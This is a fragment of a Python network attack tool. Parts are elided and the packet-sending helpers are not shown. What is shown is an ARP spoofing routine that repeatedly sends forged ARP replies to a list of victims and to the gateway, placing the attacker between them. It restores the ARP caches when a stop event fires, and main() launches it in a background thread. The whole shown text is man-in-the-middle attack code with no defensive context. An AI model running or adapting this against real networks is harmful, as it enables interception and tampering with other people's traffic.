...
def arp_spoofing(gateway_ip, gateway_mac, victims, terminate):
	while True:
		for victim in victims:
			send_arp_spoof_packet(send_ip=gateway_ip,   recv_ip=victim['ip'], recv_mac=victim['mac']) # send arp packet to victim
			send_arp_spoof_packet(send_ip=victim['ip'], recv_ip=gateway_ip,   recv_mac=gateway_mac)   # send arp packet to gateway
		time.sleep(1)                                          
		if terminate.is_set():
			for victim in victims:
				restore_arp_spoof_packet(src_ip=gateway_ip,   src_mac=gateway_mac,   recv_ip=victim['ip'], recv_mac=victim['mac'])
				restore_arp_spoof_packet(src_ip=victim['ip'], src_mac=victim['mac'], recv_ip=gateway_ip,   recv_mac=gateway_mac)   
			break
...
def main():
	...
	arp_thread = threading.Thread(target=arp_spoofing, args=(gateway_ip, gateway_mac, victims, terminate), daemon=True)
	arp_thread.start()
